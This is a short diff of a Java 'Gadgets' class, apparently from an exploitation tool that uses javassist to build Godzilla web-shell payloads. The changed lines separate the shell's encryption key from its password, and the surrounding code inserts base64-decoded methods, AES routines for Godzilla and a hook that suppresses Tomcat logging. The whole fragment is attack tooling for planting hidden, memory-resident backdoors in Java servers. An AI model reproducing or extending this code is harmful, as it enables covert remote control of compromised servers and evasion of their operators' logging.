@@ -412,7 +412,8 @@ public class Gadgets {
 			insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD));
 		} else if ("gz".equals(type)) {
 			insertField(ctClass, "payload", "Class payload ;");
-			insertField(ctClass, "xc", "String xc = " + converString(PASSWORD) + ";");
+			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
+			insertField(ctClass, "PASS", "String PASS = " + converString(PASSWORD_ORI) + ";");
 
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
@@ -426,7 +427,7 @@ public class Gadgets {
 			}
 		} else if ("gzraw".equals(type)) {
 			insertField(ctClass, "payload", "Class payload ;");
-			insertField(ctClass, "xc", "String xc = " + converString(PASSWORD) + ";");
+			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
 
 			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
 			insertTomcatNoLog(ctClass);
